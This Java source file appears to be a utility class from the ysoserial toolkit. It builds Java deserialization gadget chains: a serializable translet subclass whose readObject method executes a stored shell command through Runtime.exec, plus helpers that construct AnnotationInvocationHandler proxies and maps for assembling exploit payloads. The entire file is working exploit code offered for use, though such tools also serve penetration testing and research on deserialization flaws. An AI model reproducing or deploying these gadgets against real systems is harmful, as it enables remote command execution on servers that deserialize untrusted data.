package ysoserial.payloads.util;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings("restriction")
public class Gadgets {
	private static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

	// serializable translet subclass that will command stored in field when deserialized 
	public static class TransletPayload extends AbstractTranslet implements Serializable {		
		private static final long serialVersionUID = 5571793986024357801L;
		
		{
			namesArray = new String[0]; // needed to make TemplatesImpl happy
		}
		
		private String command;
		
		// execute stored command on deserialization
		private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
			in.defaultReadObject(); // read command string
			try {
				Runtime.getRuntime().exec(command); // execute command
			} catch (IOException e) {
				e.printStackTrace(); // not trying to be stealthy
			}			 
		}
		
		public TransletPayload withCommand(String command) {
			this.command = command;
			return this;
		}		
		
		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
		
		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) 
			throws TransletException {}
	}

	// required to make TemplatesImpl happy
	public static class Foo implements Serializable {
		private static final long serialVersionUID = 8207363842866235160L; 		
	}

	public static <T> T createMemoitizedProxy(final Map<String,Object> map, final Class<T> iface, 
		final Class<?> ... ifaces) throws Exception {	    
	    return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);	    
	}

	public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
		return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
	}
	
	public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?> ... ifaces) {
		final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
		allIfaces[0] = iface;
		if (ifaces.length > 0) {
			System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);	
		}		
		return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces , ih));
	}

	public static Map<String,Object> createMap(final String key, final Object val) {
		final Map<String,Object> map = new HashMap<String, Object>();
		map.put(key,val);
		return map;
	}
}
